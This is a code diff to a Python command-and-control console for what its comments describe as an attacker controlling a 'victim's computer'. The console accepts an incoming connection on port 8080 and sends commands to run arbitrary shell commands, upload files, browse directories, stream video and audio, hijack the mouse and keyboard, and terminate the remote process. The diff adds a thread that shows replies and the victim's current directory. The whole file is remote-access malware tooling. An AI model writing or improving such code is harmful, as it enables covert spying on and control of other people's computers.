@@ -1,8 +1,9 @@
+from time import sleep
 from shlex import split as shlexSplit
 import socket
+import threading
 
 SERVER_PORT = 8080
-
 
 # change directory and list directory contents
 CHANGE_DIR = 1
@@ -23,8 +24,45 @@ START_KEYS = 13
 END_KEYS = 14
 # end the process (on the victim's computer)
 KILL_PROC = 12
+# print the rest of the message to provide useful info
+PRINT_INFO = 15
+# inform the attacker what the current directory is
+NEW_CURR_DIR = 16
 
+# the current directory - printed to console when expecting user input
+currDir = ""
 
+"""
+	Create a class to handle information received on the main socket
+	This class will run as a separate thread
+	TODO - refactor this to be part of the protocol for each individual command
+"""
+class mainSockThread (threading.Thread):
+	def __init__(self, mainSock):
+		threading.Thread.__init__(self, daemon=True)
+		self.mainSock = mainSock
+
+	def run(self):
+		global currDir
+
+		while True:
+			data = ''
+			try:
+				data = self.mainSock.recv(4096)
+			except Exception as inst:
+				print(type(inst))
+				print(inst.args)
+				print(inst)
+				sleep(10)
+			if not data:
+				# TODO - connection closed
+				print("Connection closed! TODO - Exit program...")
+				sleep(1)
+				continue
+			if data[0] == PRINT_INFO:
+				print(str(data[1:], 'UTF-8'))
+			elif data[0] == NEW_CURR_DIR:
+				currDir = str(data[1:], 'UTF-8')
 
 """
 	Create a server socket and listen for an incoming connection
@@ -40,7 +78,6 @@ def openConnection(portNum):
 
 	# listen for incoming connections and accept them
 	(clientsocket, address) = serversocket.accept()
-
 	print("Connection established")
 
 	# close the server socket and return the socket associated with the connection
@@ -59,7 +96,7 @@ def openConnection(portNum):
 		clientsocket.sendall(data_s)
 """
 
-def handleCommand(cmd, cmdSocket):
+def handleCommand(cmd, mainSock):
 	if cmd.startswith("help"):
 		print("cd [directory] - change current directory")
 		print("ls/dir - list directory contents")
@@ -76,11 +113,10 @@ def handleCommand(cmd, cmdSocket):
 		if len(cmd) <= 3:
 			print("Please provide a directory to change to")
 			return
-		cmdSocket.sendall(bytes([CHANGE_DIR]) + cmd[3:].encode('UTF-8') + b'\0')
-		# TODO - receive error codes
+		mainSock.sendall(bytes([CHANGE_DIR]) + cmd[3:].encode('UTF-8') + b'\0')
+		sleep(0.2)
 	elif cmd in ["ls", "dir"]:
-		cmdSocket.sendall(bytes([LIST_DIR]) + b'\0')
-		# TODO - receive the information from the socket
+		mainSock.sendall(bytes([LIST_DIR]) + b'\0')
 		# TODO - option to list contents from arbitrary directory?
 	elif cmd.startswith("upload"):
 		args = shlexSplit(cmd)
@@ -102,7 +138,7 @@ def handleCommand(cmd, cmdSocket):
 		if len(cmd) <= 5:
 			print("Please provide a command line to execute")
 			return
-		cmdSocket.sendall(bytes([RUN_CMD]) + cmd[5:].encode('UTF-8') + b'\0')
+		mainSock.sendall(bytes([RUN_CMD]) + cmd[5:].encode('UTF-8') + b'\0')
 		# TODO - possible handling of error/return codes?
 	elif cmd.split(" ")[0] in ["video", "audio", "mouse", "keys"]:
 		args = cmd.split(" ")
@@ -111,47 +147,54 @@ def handleCommand(cmd, cmdSocket):
 			return
 		if args[1] == "start":
 			if args[0] == "video":
-				startVideoStream(cmdSocket) # this function will send the listening port number
+				startVideoStream(mainSock) # this function will send the listening port number
 			elif args[0] == "audio":
-				startAudioStream(cmdSocket) # this function will send the listening port number
+				startAudioStream(mainSock) # this function will send the listening port number
 			elif args[0] == "mouse":
-				startMouseControl(cmdSocket) # this function will send the listening port number
+				startMouseControl(mainSock) # this function will send the listening port number
 			elif args[0] == "keys":
-				startKeysControl(cmdSocket) # this function will send the listening port number
+				startKeysControl(mainSock) # this function will send the listening port number
 		elif args[1] == "stop":
 			if args[0] == "video":
-				cmdSocket.sendall(bytes([END_VIDEO, 0]))
+				mainSock.sendall(bytes([END_VIDEO, 0]))
 				# TODO - kill local thread for receiving video stream
 			elif args[0] == "audio":
-				cmdSocket.sendall(bytes([END_AUDIO, 0]))
+				mainSock.sendall(bytes([END_AUDIO, 0]))
 				# TODO - kill local thread for receiving video stream
 			elif args[0] == "mouse":
-				cmdSocket.sendall(bytes([END_MOUSE, 0]))
+				mainSock.sendall(bytes([END_MOUSE, 0]))
 				# TODO - kill local thread for receiving video stream
 			elif args[0] == "keys":
-				cmdSocket.sendall(bytes([END_KEYS, 0]))
+				mainSock.sendall(bytes([END_KEYS, 0]))
 				# TODO - kill local thread for receiving video stream
 		else:
 			print("Incorrect command usage! Use \"help\" to see commands")
 	elif cmd == "terminate":
-		cmdSocket.sendall(bytes([KILL_PROC, 0]))
-	else:
+		mainSock.sendall(bytes([KILL_PROC, 0]))
+	elif cmd != '':
 		print("Unknown command received! Use \"help\" to list available commands")
+
 """
 	Run the main loop for getting user input and 
 """
 def main():
+	global currDir
+
 	# establish a connection for sending commands
-	cmdSocket = openConnection(SERVER_PORT)
+	mainSock = openConnection(SERVER_PORT)
+
+	# start a separate thread to listen for info received on the main socket
+	mainListenThread = mainSockThread(mainSock)
+	mainListenThread.start()
 
 	# main command loop
-	cmd = input(">")
+	cmd = input(f"{currDir}>")
 	while cmd not in ["exit", "stop", "quit"]:
-		handleCommand(cmd, cmdSocket)
-		cmd = input(">")
+		handleCommand(cmd, mainSock)
+		cmd = input(f"{currDir}>")
 
 	# close the main command socket
-	cmdSocket.close()
+	mainSock.close()
 
 if __name__ == "__main__":
 	main()
